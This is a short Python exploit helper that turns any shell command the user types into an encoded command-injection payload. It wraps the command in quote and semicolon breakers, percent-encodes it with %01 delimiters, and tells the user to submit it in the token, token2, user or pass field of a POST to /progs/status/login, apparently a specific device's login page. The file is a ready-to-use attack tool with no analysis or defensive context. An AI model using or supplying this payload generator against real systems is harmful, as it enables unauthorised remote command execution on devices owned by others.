# Copyright 2025 Steven Johnson
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

#!/usr/bin/env python3
def process_string(input_str):
    # Step 1: Append '; to the front and ';echo ' to the command
    modified_str = '\';' + input_str + ';echo \''
    
    # Step 2: Make sure the length is divisible by 4
    while len(modified_str) % 4 != 0:
        modified_str = 'x' + modified_str  # Add 'x' to the front
    
    # Step 3: Convert each character to its ASCII value, prefixed by %
    ascii_encoded = ''.join([f'%{ord(char):x}' for char in modified_str])

    # Step 4: Append %01 to the beginning and end
    final_str = f'%01{ascii_encoded}%01'
    
    return final_str

input_string = input("Enter your command: ")
result = process_string(input_string)
print("Put this output in the token, token2, user, or pass field")
print("in the POST request to /progs/status/login.\n")
print(result + "\n")
